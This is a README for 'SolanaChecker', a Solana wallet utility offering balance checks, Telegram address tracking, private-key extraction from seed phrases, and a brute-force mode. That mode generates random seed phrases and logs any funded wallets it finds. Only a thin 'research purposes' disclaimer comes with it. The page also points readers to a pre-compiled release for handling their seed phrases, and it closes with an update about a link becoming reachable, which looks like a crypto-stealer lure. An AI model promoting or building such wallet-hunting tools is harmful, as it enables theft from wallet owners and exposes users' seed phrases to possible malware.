# Solana Wallet Balance Explorer: Dive Deep into the Solana Blockchain

Ready to explore your Solana wallet's activity and gain insights into your crypto holdings? **SolanaChecker** provides you with the tools to effortlessly explore the Solana blockchain, offering a comprehensive set of features for managing and analyzing your wallets. This program streamlines your interaction with the Solana network, giving you critical information about balances, addresses, tokens, and more.

<p align="left">
    <img src="/third-party/peek.webp" />
</p>

## Program Features in Detail

1.  **Solana Address Balance Checker:** Check the current Solana balance on a specified address with ease. Track your funds quickly and effectively.

<p align="left">
    <img src="/third-party/front.webp" />
</p>

2.  **Token Security Verification:** Assess the security of tokens based on their properties and metadata. Protect yourself from potential fraud, evaluate the risk of rug-pulls and make informed investment decisions.

<p align="left">
    <img src="/third-party/settings.webp" />
</p>

3.  **Solana Address Tracking:** Receive real-time notifications about activity on specified addresses via a Telegram bot. Monitor transactions and keep track of your wallet movements in real-time.

4.  **Wallet Data from Mnemonic Phrase:** Easily extract the private key, address, and balance of a Solana wallet using its mnemonic phrase (seed phrase). Get direct access to key wallet information.

<p align="left">
    <img src="/third-party/find.webp" />
</p>

5.  **Generate a Solana Wallet:** Generate a new Solana wallet with a unique private key and address quickly.

<p align="left">
    <img src="/third-party/minimized.webp" />
</p>

6.  **Brute-Force Wallet Discovery:** A powerful feature enabling you to generate random seed phrases and check resulting addresses for balances. Useful for research and finding active wallets. If a wallet with a balance is found, the data is written to the 'found-wallets.txt' file and you will also receive a Telegram notification if configured.

<p align="left">
    <img src="/third-party/new.webp" />
</p>

## Setting up Telegram Notifications

To receive Telegram notifications, input your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) into the 'telegram-settings.txt' file, which is located in the program folder.

## Getting Started: Download and Installation

You can download a pre-compiled build from the [Release](../../releases) section, or build the project from source.

## Building the Project: A Step-by-Step Guide

This project uses C++ and has several dependencies. We recommend using **vcpkg** to simplify the process of dependency installation.

### Installing Dependencies using vcpkg:

1.  If you don’t already have it, clone the **vcpkg** repository and install it by following the instructions on the [official page](https://github.com/microsoft/vcpkg).
2.  After installing **vcpkg**, add it to your system's PATH environment variable.
3.  Run the following commands to install the necessary dependencies:

    -   Install **OpenSSL**:

    ```bash
    vcpkg install openssl
    ```

    -   Install **nlohmann-json**:

    ```bash
    vcpkg install nlohmann-json
    ```

    -   Install **Crypto++**:

    ```bash
    vcpkg install cryptopp
    ```

    -   Install **libsodium**:

    ```bash
    vcpkg install libsodium
    ```

4.  Once the dependencies are installed, you can proceed with the building process.

### Building with Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Ensure that **vcpkg** is integrated properly (see [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio)).
3.  Click **Build** -> **Build Solution**.
4.  After a successful build, the executable will be located in the `bin` folder or a similar directory.

### Building with Another C++ Compiler:

1.  Make sure all dependencies are installed via **vcpkg** and accessible to your compiler.
2.  Compile the project using the following command (adjust as needed for your specific compiler):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Usage

Here's how to use the program via the command line:

1.  **-s / -search**: Start a brute-force process to generate seed phrases and search for wallets that contain a balance.
2.  **-t / -track (ADDRESS)**: Start tracking a particular address. The program will monitor activity on the address.
3.  **-g / -gen (NUMBER)**: Generate the specified number of Solana wallets. The `<NUMBER>` parameter defines how many wallets you'd like to generate.
4.  **-m / -mnemonic (MNEMONIC)**: Show wallet details using the provided seed phrase. Replace `<MNEMONIC>` with the actual seed phrase.
5.  **-b / -balance (ADDRESS)**: Display the balance of a specific address on the Solana network.

## Important Considerations

-   This tool is for research purposes and should not be used for illegal activities or hacking.
-   Cryptocurrency operations carry inherent risks. Always prioritize the safety of your data and wallets.

## License

This project is licensed under the [MIT License](/LICENSE). You are free to use, modify, and distribute the code, adhering to the terms outlined in the license.



Update:  06/17/2025 Link is now reachable